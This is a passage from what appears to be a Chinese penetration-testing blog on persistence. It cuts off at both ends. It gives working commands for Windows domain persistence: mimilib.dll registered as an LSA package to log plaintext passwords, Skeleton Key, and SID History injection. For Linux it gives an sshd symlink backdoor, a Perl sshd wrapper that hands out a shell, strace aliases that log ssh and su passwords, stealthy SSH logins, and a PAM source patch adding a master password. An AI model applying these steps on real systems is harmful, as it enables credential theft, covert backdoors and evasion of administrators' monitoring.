是可扩展的,导致在系统启动时我们可以加载一个自定义的 dll ,一个用于记录所有登录到当前系统的明文账号密码的 dll , 利用 mimikatz  中 mimilib.dll  文件</p><p>将 mimikatz 中的 mimilib.dll  放到系统的 C:\Windows\system32 目录下（DLL的位数需要与windows位数相同），并将 mimilib.dll 添加到注册表中，使用此方法即使系统重启，也不会影响到持久化的效果。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#上传mimilib.dll到system32目录下面</span></span><br><span class="line"><span class="built_in">copy</span> mimilib.dll %systemroot%\system32</span><br><span class="line"><span class="comment">#检验是否上传成功</span></span><br><span class="line">shell <span class="built_in">dir</span> C:\Windows\System32\mimilib.dll</span><br><span class="line"><span class="comment">#查询注册表项值HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa</span></span><br><span class="line">reg query hklm\system\currentcontrolset\control\lsa\ /v <span class="string">&quot;Security Packages&quot;</span></span><br><span class="line"><span class="comment">#添加注册表项值的数据，/d表示数据，/t表示数据类型</span></span><br><span class="line">reg add <span class="string">&quot;hklm\system\currentcontrolset\control\lsa&quot;</span> /v <span class="string">&quot;Security Packages&quot;</span> /d <span class="string">&quot;kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib&quot;</span> /t REG_MULTI_SZ</span><br><span class="line"><span class="comment">#注：在/d选项中\0类似于空格或者换行，为了使每一项区分开来</span></span><br></pre></td></tr></table></figure><blockquote><p>注意：在powershell中执行reg，在cmd中执行可能会报错</p></blockquote><p>修改前：</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209071357555.png" alt="image-20220907135736360" style="zoom:33%;" /><p>修改后</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209071358312.png" alt="image-20220907135811101" style="zoom:33%;" /><blockquote><p>在注册表中的mimilib.dll文件会指引我们去系统目录下调用相应的dll文件</p></blockquote><p>计算机重启后，如果有用户成功登录到当前系统中,会在 c:\windows\system32  目录下生成一个用于记录登账账号密码的 kiwissp.log  文件</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209071503773.png" alt="image-20220907150312481" style="zoom:33%;" /><blockquote><p>但是呢！？域控机器甚至很多的服务器都是很少有重启的行为啦，因为重启对域内机器的使用影响很大</p><p>下面的方法避免重启操作~~</p></blockquote><ul><li>Memory Updating of SSPs</li></ul><blockquote><p>使用mimikatz将伪造的SSP注入内存，这样做不会在系统中留下二进制文件，但如果域控制器重启，被注入内存的伪造的SSP将会丢失。</p><p>直接注入内存的好处就是不需要操作dll文件以及重启之类的操作，只要用户进行登录就可以记录</p></blockquote><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mimikatz privilege::debug</span><br><span class="line">mimikatz misc::memssp</span><br><span class="line"><span class="built_in">type</span> C:\Windows\System32\mimilsa.log</span><br></pre></td></tr></table></figure><h1 id="Skeleton-Key"><a href="#Skeleton-Key" class="headerlink" title="Skeleton Key"></a>Skeleton Key</h1><h2 id="Skeleton-Key简介"><a href="#Skeleton-Key简介" class="headerlink" title="Skeleton Key简介"></a>Skeleton Key简介</h2><ul><li><strong>Skeleton Key是一种不需要域控重启即能生效的维持域控权限方法。</strong> </li><li>Skeleton Key被安装在64位的域控服务器上,支持Windows Server2003—Windows Server2012 R2,能够让所有域用户使用同一个万能密码进行登录，现有的所有域用户使用原密码仍能继续登录，注意并不能更改用户权限，重启后失效。</li></ul><h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><ul><li>在域控安装Skeleton Key</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#mimikatz</span><br><span class="line">privilege::debug</span><br><span class="line">misc::skeleton</span><br></pre></td></tr></table></figure><ul><li>域内主机使用Skeleton Key登录域控</li></ul><blockquote><p>mimikatz的默认Skeleton Key设置为mimikatz，Skeleton Key只是给所有账户添加了一个万能密码，无法修改账户的权限</p></blockquote><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#使用万能密码连接，下面两种登录方式都是可以的</span></span><br><span class="line">net use \\DC.de1ay.com mimikatz /user:administrator@gungnir.top</span><br><span class="line">net use \\DC.de1ay.com mimikatz /user:gungnir\administrator</span><br><span class="line"><span class="comment">#检验</span></span><br><span class="line"><span class="built_in">dir</span> \\DC.de1ay.com\c<span class="variable">$</span> </span><br></pre></td></tr></table></figure><blockquote><p>补充：两种登录方式</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209071633372.png" alt="image-20220907163357184" style="zoom: 33%;" /></blockquote><h1 id="SID-History"><a href="#SID-History" class="headerlink" title="SID History"></a>SID History</h1><blockquote><p>SID:Security Identity</p></blockquote><h2 id="SID简介"><a href="#SID简介" class="headerlink" title="SID简介"></a>SID简介</h2><p>每个用户都有自己的SID。SID的作用主要是<strong>跟踪安全主体控制用户连接资源时的访问权限</strong>。(简而言之就是通过SID判断用户访问资源的权限)</p><p>接下来引入一个场景：如果将A域中的域用户迁移到B域中，那么在B域中该用户的SID会随之改变，进而影响迁移后用户的权限，导致迁移后的用户不能访问本来可以访问的资源。</p><blockquote><p>SID就相当于权限的标识，失去了SID也就失去了权与力。</p></blockquote><p>如何记住曾经的SID呢？那么就需要用到SID History属性！！</p><p>SID History是在域迁移过程中需要使用的一个<strong>属性</strong>。</p><p>SID History的作用是在域迁移过程中保持域用户的访问权限，即如果迁移后用户的SID改变了，系统会将其原来的SID添加到迁移后用户的SID History属性中，使迁移后的用户保持原有权限、能够访问其原来可以访问的资源。</p><p>使用mimikatz，可以将SID History属性添加到域中任意用户的SID History属性中。在实战中，如果获得了域管理员权限，则<strong>可以将SID History作为实现持久化的方法</strong>。</p><h2 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h2><blockquote><p>上述原理如何利用呢？简单解释一下:</p><p>域内用户的SID History属性如果其内容是administrator的SID，那么它也将具备administrator的“权与力”！</p><p>我们通过mimikatz将新建的用户的SID History属性改为管理员用户即可实现权限维持~~</p></blockquote><ul><li>域控上添加并启用域账户，之后便可以使用alvin登录域内机器</li></ul><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-disabled no表示启用</span></span><br><span class="line">dsadd user <span class="string">&quot;cn=alvin,dc=gungnir,dc=top&quot;</span> <span class="literal">-disabled</span> no <span class="literal">-pwd</span> <span class="number">1</span>qaz@WSX1</span><br><span class="line"><span class="comment">#验证</span></span><br><span class="line">net user </span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209080015460.png" alt="image-20220908001506287" style="zoom:50%;" /><ul><li>Mimikatz添加后门</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sid::patch</span><br><span class="line">sid::add /sam:alvin /new:administrator</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209080026170.png" alt="image-20220908002639046" style="zoom: 50%;" /><ul><li>PowerShell查看alvin用户的SID History</li></ul><blockquote><p>可以清除的看到是域控的SID</p></blockquote><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> ActiveDirectory</span><br><span class="line"><span class="built_in">Get-ADUser</span> alvin <span class="literal">-Properties</span> sidhistory</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209080027213.png" alt="image-20220908002725077" style="zoom:50%;" /><ul><li>验证域用户alvin是否有具有administrator权限：</li></ul><blockquote><p>此时我们的alvin用户虽然不在管理员组，但是其具有域控功能</p></blockquote><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">whoami</span><br><span class="line"><span class="built_in">dir</span> \\DC.gungnir.top\c<span class="variable">$</span></span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209080020451.png" alt="image-20220908002053314" style="zoom:50%;" />]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 内网 </category>
          
          <category> 权限维持 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 权限维持 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0x31 - Linux权限维持</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/0x31-Linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/0x31-Linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="SSH后门"><a href="#SSH后门" class="headerlink" title="SSH后门"></a>SSH后门</h1><blockquote><p>常见后门方式，隐蔽性也比较高，也很方便进入系统</p></blockquote><h2 id="软链接-sshd"><a href="#软链接-sshd" class="headerlink" title="软链接 sshd"></a>软链接 sshd</h2><blockquote><ul><li><p>类似Windows下面的快捷方式，可以通过访问对应软链接实现访问对应程序的效果，比如python和python3都链接指向python3.9</p></li><li><p>ln命令</p></li></ul><blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">    --backup[=CONTROL]  为每个已存在的目标文件创建备份文件</span><br><span class="line">-b        类似--backup，但不接受任何参数</span><br><span class="line">-d, -F, --directory   创建指向目录的硬链接(只适用于超级用户)</span><br><span class="line">-f, --force     强行删除任何已存在的目标文件</span><br><span class="line">-i, --interactive           覆盖既有文件之前先询问用户；</span><br><span class="line">-L, --logical               取消引用作为符号链接的目标</span><br><span class="line">-n, --no-dereference        把符号链接的目的目录视为一般文件；</span><br><span class="line">-P, --physical              直接将硬链接到符号链接</span><br><span class="line">-r, --relative              创建相对于链接位置的符号链接</span><br><span class="line">-s, --symbolic              对源文件建立符号链接，而非硬链接；</span><br><span class="line">-S, --suffix=SUFFIX         用<span class="string">&quot;-b&quot;</span>参数备份目标文件后，备份文件的字尾会被加上一个备份字符串，预设的备份字符串是符号“~”，用户可通过“-S”参数来改变它；</span><br><span class="line">-t, --target-directory=DIRECTORY  指定要在其中创建链接的DIRECTORY</span><br><span class="line">-T, --no-target-directory   将“LINK_NAME”视为常规文件</span><br><span class="line">-v, --verbose               打印每个链接文件的名称</span><br><span class="line">    --<span class="built_in">help</span>    显示此帮助信息并退出</span><br><span class="line">    --version   显示版本信息并退出</span><br></pre></td></tr></table></figure></blockquote></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!bash</span></span><br><span class="line"><span class="comment">#将目录/usr/sbin下的文件sshd链接到目录/tmp下的文件su</span></span><br><span class="line"><span class="comment">#/tmp/su -oport=12345表示以sshd开启了一个12345的端口，表示在12345端口有个ssh服务。可以通过此端口以ssh连接主机</span></span><br><span class="line"><span class="built_in">ln</span> -sf /usr/sbin/sshd /tmp/su;/tmp/su -oport=12345</span><br><span class="line">ssh root@192.168.78.19 -p 12345</span><br><span class="line"></span><br><span class="line"><span class="comment">#检验端口启动</span></span><br><span class="line">netstat -anlp | grep 12345</span><br><span class="line"><span class="comment">#检查su进程</span></span><br><span class="line">ps -elf | grep su</span><br></pre></td></tr></table></figure><p>输入任意密码就可以root用户权限登陆，如果root用户被禁止登陆时，可以利用其他存在的用户身份登陆</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh root@ip -p 12345<span class="comment">#ssh以指定端口登录对面机器，输入任意密码即可登录</span></span><br></pre></td></tr></table></figure><blockquote><p>注：为什么产生这种现象，参考：<a href="https://www.cnblogs.com/likaiming/p/11007919.html">Linux的一个后门引发对PAM的探究</a></p></blockquote><h2 id="SSH-Server-Wrapper"><a href="#SSH-Server-Wrapper" class="headerlink" title="SSH Server Wrapper"></a>SSH Server Wrapper</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!bash</span></span><br><span class="line"><span class="built_in">cd</span> /usr/sbin</span><br><span class="line"><span class="built_in">mv</span> sshd ../bin</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;#!/usr/bin/perl&#x27;</span> &gt;sshd</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;exec &quot;/bin/sh&quot; if (getpeername(STDIN) =~ /^..LF/);&#x27;</span> </span><br><span class="line">&gt;&gt;sshd</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;exec &#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&#x27;</span> &gt;&gt;sshd</span><br><span class="line"><span class="built_in">chmod</span> u+x sshd</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">socat STDIO TCP4:192.168.78.37:22,sourceport=19526</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208212333280.png" alt="image-20220821233322129"></p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208212333898.png" alt="image-20220821233342782"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#其中`x00x00LF`是19526的大端形式，便于传输和处理。如果你想修改源端口，</span></span><br><span class="line">可以用python的struct标准库实现</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> struct</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>buffer = struct.pack(<span class="string">&#x27;&gt;I6&#x27;</span>,<span class="number">19526</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> <span class="built_in">repr</span>(buffer)</span><br><span class="line"><span class="string">&#x27;\x00\x00LF&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>buffer = struct.pack(<span class="string">&#x27;&gt;I6&#x27;</span>,<span class="number">13377</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> buffer</span><br><span class="line">4A</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>buffer = struct.pack(<span class="string">&#x27;&gt;I6&#x27;</span>,<span class="number">16714</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> buffer</span><br><span class="line">AJ</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208212334709.png" alt="image-20220821233416497"></p><ul><li>原理:</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">init首先启动的是/usr/sbin/sshd,脚本执行到getpeername这里的时候，正则</span><br><span class="line">匹配会失败，于是执行下一句，启动/usr/bin/sshd，这是原始sshd。</span><br><span class="line">原始的sshd监听端口建立了tcp连接后，会fork一个子进程处理具体工作。</span><br><span class="line">这个子进程，没有什么检验，而是直接执行系统默认的位置的/usr/sbin/sshd，这</span><br><span class="line">样子控制权又回到脚本了。</span><br><span class="line">此时子进程标准输入输出已被重定向到套接字，getpeername能真的获取到客户端的</span><br><span class="line">TCP源端口，如果是19526就执行sh给个shell。</span><br><span class="line">来自https://www.anquanke.com/post/id/155943#h2-9</span><br></pre></td></tr></table></figure><h2 id="SSH-Key"><a href="#SSH-Key" class="headerlink" title="SSH Key"></a>SSH Key</h2><h3 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#生成私钥和公钥：</span></span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line"><span class="comment">#会在当前用户目录的.ssh目录下面生成一对公私钥</span></span><br><span class="line"><span class="comment">#把公钥id_rsa.pub发送到目标上,并修改目标主机上的文件：</span></span><br><span class="line">vim /root/.ssh/authorized_keys</span><br><span class="line"><span class="comment">#连接用户</span></span><br><span class="line">ssh root@ip</span><br><span class="line"><span class="comment">#更改时间：</span></span><br><span class="line"><span class="built_in">touch</span> -r：&lt;参考文件或目录&gt;  <span class="comment">#把指定文件或目录的日期时间，统统设成和参考文件或目录的日期时间相同；</span></span><br><span class="line"><span class="comment">#如把authorized_keys的时间换成known_hosts的时间</span></span><br><span class="line"><span class="built_in">touch</span> -r known_hosts authorized_keys</span><br><span class="line"><span class="comment">#重启ssh服务：</span></span><br><span class="line">service ssh restart</span><br></pre></td></tr></table></figure><h3 id="关于known-hosts文件"><a href="#关于known-hosts文件" class="headerlink" title="关于known_hosts文件:"></a>关于<strong>known_hosts</strong>文件:</h3><blockquote><p>用户的.ssh目录下面有有个<strong>known_hosts</strong>文件，这个文件存储本机曾经ssh连接过的远程主机的公钥，用来在连接时和对面主机上的公钥进行比对，如果一样则进行下一步操作！</p><p>ssh会把你每个你访问过计算机的公钥(public key)都记录在known_hosts。当下次访问相同计算机时，OpenSSH会核对公钥。如果公钥不同，OpenSSH会发出警告， 避免你受到DNS Hijack之类的攻击。</p><p>参考：<a href="https://www.cnblogs.com/fonxian/p/11228760.html">https://www.cnblogs.com/fonxian/p/11228760.html</a></p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208272057217.png" alt="image-20220827205707043" style="zoom:50%;" /></blockquote><h2 id="SSH-Keylogger键盘记录"><a href="#SSH-Keylogger键盘记录" class="headerlink" title="SSH Keylogger键盘记录"></a>SSH Keylogger键盘记录</h2><blockquote><p>了解即可，知道怎么用，alias后门的一种</p><p>我们可以通过记录键盘值获取许多信息，比如在主机中登陆了其他的东西，ssh就能获取</p></blockquote><p>编辑当前用户下的 .bashrc 文件，在配置文件末尾添加：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">alias</span> ssh=<span class="string">&#x27;strace -o /tmp/sshpwd-`date +%d%h%m%s`.log -e read,write,connect -s2048 ssh&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#strace 我们可以使用strace对应用的系统调用和信号传递的跟踪结果来对应用进行分析，以达到解决问题或者是了解应用工作过程的目的。</span></span><br><span class="line"><span class="comment">#在命令执行的过程中，strace会记录和解析命令进程的所有系统调用以及这个进程所接收到的所有的信号值。</span></span><br><span class="line"><span class="comment">#参数-o filename 将strace的输出写入文件filename</span></span><br><span class="line"><span class="comment">#参数-e read=set 输出从指定文件中读出 的数据.例如: -e read=3,5</span></span><br><span class="line"><span class="comment">#参数-e write=set 输出写入到指定文件中的数据.</span></span><br><span class="line"><span class="comment">#参数-s strsize 指定输出的字符串的最大长度.默认为32.文件名一直全部输出.</span></span><br><span class="line"><span class="comment">#末尾的ssh是以strace ssh启动到达ssh程序，使用strace了解程序输入输出，类似debug的过程~~所以我们会在不知不觉中生成记录键盘输入的文件log，并且无感的执行了ssh</span></span><br></pre></td></tr></table></figure><blockquote><p>解释：</p><p>alias讲ssh命令别名等于<code>strace -o /tmp/sshpwd-date +%d%h%m%s.log -e read,write,connect -s2048 ssh</code>,与执行ssh有相同的效果，但是其在不知不觉中执行了没有回显的命令，将在temp目录下生成一个log文件~~~</p><p>ssh连接输入密码时的密码无论错误或者正确都能记录到log里。</p><p>如果想更加隐蔽 可以把生成的log改去其他目录~~~</p><p>如下图中，read函数里面的内容就是我们每次按下的按键！~~</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208212350723.png" alt="image-20220821235055521" style="zoom:50%;" /></blockquote><h2 id="SSH隐身登录"><a href="#SSH隐身登录" class="headerlink" title="SSH隐身登录"></a>SSH隐身登录</h2><blockquote><p>较好的方式，隐身登录系统，不会被last who w等指令检测到</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208291236826.png" alt="image-20220829123612629" style="zoom: 33%;" /></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -T root@192.168.22.11 /bin/bash -i</span><br><span class="line">ssh -o UserKnownHostsFile=/dev/null -T root@192.168.22.11 /bin/bash -<span class="keyword">if</span></span><br></pre></td></tr></table></figure><blockquote><p>补充一些命令：</p><ul><li>who     查看当前登录用户（tty本地登陆  pts远程登录）</li><li>w       查看系统信息，想知道某一时刻用户的行为，可以看到当前时间有几个用户在线</li><li>last     最后登录时间的用户，，still logged in表示还在该用户依旧在线，tty本地登陆  pts远程登录</li><li>uptime  查看登陆多久、多少用户，负载</li><li>查询特权用户特权用户(uid 为0)</li></ul><blockquote><p>awk -F: ‘$3&#x3D;&#x3D;0{print $1}’ &#x2F;etc&#x2F;passwd</p></blockquote><ul><li>查询可以远程登录的帐号信息</li></ul><blockquote><p>awk ‘&#x2F;$1|$6&#x2F;{print $1}’ &#x2F;etc&#x2F;shadow</p></blockquote><ul><li>除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</li></ul><blockquote><p>more &#x2F;etc&#x2F;sudoers | grep -v “^#|^$” | grep “ALL&#x3D;(ALL)”</p></blockquote></blockquote><h1 id="Strace后门"><a href="#Strace后门" class="headerlink" title="Strace后门"></a>Strace后门</h1><blockquote><p>SSH Keylogger键盘记录中有讲到如何使用strace创建后门~~</p></blockquote><p>strace常用来跟踪进程执行时的系统调用和所接收的信号。 在Linux世界，进程不能直接访问硬件设备，当进程需要访问硬件设备(比如读取磁盘文件，接收网络数据等等)时，必须由用户态模式切换至内核态模式，通 过系统调用访问硬件设备。strace可以跟踪到一个进程产生的系统调用,包括参数，返回值，执行消耗的时间。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh=<span class="string">&#x27;strace -o /tmp/sshpwd-`date +%d%h%m%s`.log -e read,write,connect -s2048 ssh&#x27;</span></span><br><span class="line">su=<span class="string">&#x27;strace -o /tmp/sulog-`date +%d%h%m%s`.log -e read,write,connect -s2048 su&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="Linux-PAM-后门"><a href="#Linux-PAM-后门" class="headerlink" title="Linux PAM 后门"></a>Linux PAM 后门</h1><blockquote><ul><li>难以发现 实用，源码级别的后门</li><li>PAM是Linux默认的ssh认证登录机制，因为他是开源的，我们可以修改源码实现自定义认证逻辑，达到记录密码、自定义密码登录、dns带外等功能。参考学习：<a href="https://www.cnblogs.com/kevingrace/p/8671964.html">Linux下PAM模块学习总结</a></li><li>概述：当我们获取目标主机权限后，可以尝试对pam组件源码进行修改，重新编译生成so文件，</li></ul></blockquote><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><h3 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dpkg -l | grep pam<span class="comment">#查看pam版本</span></span><br></pre></td></tr></table></figure><h3 id="centos"><a href="#centos" class="headerlink" title="centos"></a>centos</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/centos-release<span class="comment">#查看操作系统版本</span></span><br><span class="line">CentOS Linux release 7.7.1908 (Core)</span><br><span class="line"></span><br><span class="line">rpm -qa|grep pam<span class="comment">#查看pam版本，后门下载对应版本的源码</span></span><br><span class="line">gnome-keyring-pam-3.28.2-1.el7.x86_64</span><br><span class="line">fprintd-pam-0.8.1-2.el7.x86_64</span><br><span class="line">pam-1.1.8-22.el7.x86_64</span><br></pre></td></tr></table></figure><p>centos需要关闭selinux，临时关闭<code>setenforce 0</code>。永久关闭需要修改<code>/etc/selinux/config</code>，将其中SELINUX设置为disabled。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sestatus命令</span></span><br><span class="line">SELinux status:                 disabled<span class="comment">#查询结果</span></span><br><span class="line"><span class="comment">#/etc/selinux/config命令</span></span><br><span class="line"><span class="comment">#结果：</span></span><br><span class="line"><span class="comment"># This file controls the state of SELinux on the system.</span></span><br><span class="line"><span class="comment"># SELINUX= can take one of these three values:</span></span><br><span class="line"><span class="comment">#     enforcing - SELinux security policy is enforced.</span></span><br><span class="line"><span class="comment">#     permissive - SELinux prints warnings instead of enforcing.</span></span><br><span class="line"><span class="comment">#     disabled - No SELinux policy is loaded.</span></span><br><span class="line">SELINUX=disabled</span><br><span class="line"><span class="comment"># SELINUXTYPE= can take one of three values:</span></span><br><span class="line"><span class="comment">#     targeted - Targeted processes are protected,</span></span><br><span class="line"><span class="comment">#     minimum - Modification of targeted policy. Only selected processes are protected.</span></span><br><span class="line"><span class="comment">#     mls - Multi Level Security protection.</span></span><br><span class="line">SELINUXTYPE=targeted</span><br></pre></td></tr></table></figure><h2 id="下载pam源码"><a href="#下载pam源码" class="headerlink" title="下载pam源码"></a>下载pam源码</h2><h3 id="快捷命令获取源码"><a href="#快捷命令获取源码" class="headerlink" title="快捷命令获取源码~"></a>快捷命令获取源码~</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get <span class="built_in">source</span> libpam-modules=`dpkg -s libpam-modules | grep -i version | <span class="built_in">cut</span> -d<span class="string">&#x27; &#x27;</span> -f2`</span><br><span class="line"></span><br><span class="line"><span class="comment">#apt-get source - 可以下载源码文件</span></span><br><span class="line"><span class="comment">#dpkg -s libpam-modules | grep -i version | cut -d&#x27; &#x27; -f2- 查询Ubuntu的pam版本</span></span><br></pre></td></tr></table></figure><h3 id="开源源码下载"><a href="#开源源码下载" class="headerlink" title="开源源码下载"></a>开源源码下载</h3><blockquote><p>查看PAM版本<code>rpm -qa|grep pam</code></p><p>下载对应源码:</p><blockquote><blockquote><p>Ubuntu建议在这里下载</p></blockquote><ul><li><a href="https://code.launchpad.net/~ubuntu-core-dev/ubuntu/+source/pam/+git/pam">https://code.launchpad.net/~ubuntu-core-dev/ubuntu/+source/pam/+git/pam</a></li></ul><blockquote><p>用GitHub上面的源码编译出来貌似有点问题，</p></blockquote><ul><li><a href="https://github.com/linux-pam/linux-pam/archive/refs/tags/Linux-PAM-1_1_8.tar.gz">https://github.com/linux-pam/linux-pam/archive/refs/tags/Linux-PAM-1_1_8.tar.gz</a></li><li><a href="https://github.com/linux-pam/linux-pam/archive/refs/tags/v1.3.1.tar.gz">https://github.com/linux-pam/linux-pam/archive/refs/tags/v1.3.1.tar.gz</a></li></ul></blockquote><p><strong>针对基于 Debian 的 Linux 发行版</strong>，是否有适配其他发行版请阅读<a href="https://github.com/linux-pam/linux-pam">readme文件</a></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://github.com/linux-pam/linux-pam/archive/refs/tags/v1.3.1.tar.gz</span><br><span class="line">tar -zxf v1.3.1.tar.gz</span><br></pre></td></tr></table></figure><h2 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h2><blockquote><p>编译的环境</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Ubuntu</span></span><br><span class="line">apt install -y gcc flex dpkg-dev</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#centos</span></span><br><span class="line"><span class="comment">#需要先换源，然后更新依赖关系~</span></span><br><span class="line">yum install -y epel-release</span><br><span class="line"><span class="comment">#安装gcc编译器和flex库</span></span><br><span class="line">yum install gcc flex flex-devel -y</span><br></pre></td></tr></table></figure><blockquote><ul><li>centos常用包管理命令参考：<a href="https://vence.github.io/2016/05/14/centos-packagemanager/">https://vence.github.io/2016/05/14/centos-packagemanager/</a></li><li>按照过程中遇到问题：yum install告知“没有可用软件包 xxx”</li></ul><blockquote><p>需要先换源，然后update，参考：<a href="https://blog.csdn.net/wsuyixing/article/details/125824442">https://blog.csdn.net/wsuyixing/article/details/125824442</a></p></blockquote></blockquote><h2 id="修改pam-unix-auth-c源码"><a href="#修改pam-unix-auth-c源码" class="headerlink" title="修改pam_unix_auth.c源码"></a>修改pam_unix_auth.c源码</h2><blockquote><p>linux-pam-Linux-PAM-1_1_8&#x2F;modules&#x2F;pam_unix&#x2F;pam_unix_auth.c</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> v1.3.1</span><br><span class="line">vim ./modules/pam_unix/pam_unix_auth.c</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//添加代码</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(<span class="string">&quot;11pm&quot;</span>,p)==<span class="number">0</span>) &#123;<span class="keyword">return</span> PAM_SUCCESS;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>11pm为设置的密码。如果输入的密码是11pm则直接返回成功，不会进行其他操作</p></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208212352885.png" alt="image-20220821235238764" style="zoom:50%;" /><h2 id="编译生成so文件"><a href="#编译生成so文件" class="headerlink" title="编译生成so文件"></a>编译生成so文件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> v1.3.1</span><br><span class="line"><span class="comment">#自动生成配置脚本，大部分时候好像是需要如此</span></span><br><span class="line">./autogen.sh</span><br><span class="line"><span class="comment">#开始编译</span></span><br><span class="line"><span class="comment">#配置（./configure --help | less查看配置）</span></span><br><span class="line">./configure --prefix=/user --exec-prefix=/usr --localstatedir=/var --sysconfdir=/etc --disable-selinux --with-libiconv-prefix=/usr</span><br><span class="line">make</span><br></pre></td></tr></table></figure><p>编译后生成so文件的路径：Linux-PAM-1.1.8&#x2F;modules&#x2F;pam_unix&#x2F;.lib&#x2F;pam_unix.so</p><p><img 